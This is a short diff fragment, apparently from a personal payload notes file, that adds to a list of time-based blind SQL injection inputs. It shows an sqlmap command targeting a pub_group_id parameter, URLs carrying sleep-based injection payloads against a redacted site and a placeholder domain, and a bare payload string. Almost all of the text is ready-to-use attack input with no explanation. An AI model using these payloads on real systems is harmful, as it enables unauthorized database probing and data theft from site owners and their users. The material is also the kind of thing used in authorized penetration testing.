@@ -8,3 +8,5 @@ sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --forc
 https://reducted.com/pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b'
 
 +(select*from(select(sleep(5)))a)+
+
+www.domain.com/ajax-hof/?toplimit=2&topsort=followers+or+sleep(0.000000001)
